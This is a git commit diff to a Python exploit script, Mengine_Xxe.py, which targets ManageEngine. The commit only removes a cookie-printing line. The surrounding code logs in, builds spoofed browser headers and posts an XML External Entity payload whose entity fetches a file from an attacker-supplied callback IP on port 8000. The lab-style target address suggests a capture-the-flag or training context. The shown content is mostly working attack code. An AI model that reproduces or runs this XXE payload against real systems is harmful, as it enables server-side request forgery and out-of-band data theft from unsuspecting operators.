d2fc77f4ecbe7afb59a63504eadd89329cad1a2a
Devcoinfet <34756993+devcoinfet@users.noreply.github.com>
2019-03-27 00:25:26 -0400

    Update Mengine_Xxe.py

--- Mengine_Xxe.py
+++ Mengine_Xxe.py
@@ -10,7 +10,6 @@ def login_rider(ip_address,callback_ip):
     with requests.Session() as s:
 	   shit = s.post(login_url, headers=manage_engine_headers, data=login_data)
 	   print(shit.text)
-	   print(s.cookies.get_dict())
 	   xxe_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Referer": "http://10.10.10.132:8080/SetUpWizard.do?forwardTo=apidoc", "Connection": "keep-alive", "Pragma": "no-cache", "Cache-Control": "no-cache"}
 	   xxe_data={"OPERATION_NAME": "add", "INPUT_DATA": "<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY sp SYSTEM \"http://"+callback_ip+":8000/test.txt\">\n]>\n<r>&sp;</r>\n"}
 	   response = s.post(api_url, headers=xxe_headers, cookies=s.cookies.get_dict(), data=xxe_data)
